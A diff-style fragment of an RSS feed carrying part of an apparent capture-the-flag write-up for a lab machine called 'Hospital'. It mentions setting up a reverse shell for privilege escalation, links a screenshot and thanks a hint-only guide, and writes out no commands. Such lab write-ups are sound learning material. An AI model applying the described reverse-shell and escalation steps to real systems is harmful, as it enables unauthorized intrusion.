+&lt;p>We set up a reverse shell, hoping to obtain a connection with elevated privileges, given that we have access.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/image-14.png"
+width="1362"
+height="607"
+srcset="https://shaanksm.github.io/p/hospital-writeup/image-14_huf0ac3c6ac73a8f60b8e1d89c6bd4b289_53193_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/image-14_huf0ac3c6ac73a8f60b8e1d89c6bd4b289_53193_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="224"
+data-flex-basis="538px"
+>&lt;/p>
+&lt;p>Box forums provide some guidance, certain hints or questions can be too revealing. Therefore, I&amp;rsquo;d like to express my gratitude to this particular source that crafted a writeup containing only hints. It proved incredibly helpful during my privilege escalation phase.&lt;/p>
+&lt;p>Thank a lot : &lt;a class="link" href="https://svadhyayan.com/htb-hospital-writeup/" target="_blank" rel="noopener"
+>https://svadhyayan.com/htb-hospital-writeup/&lt;/a>&lt;/p></description></item></channel></rss>
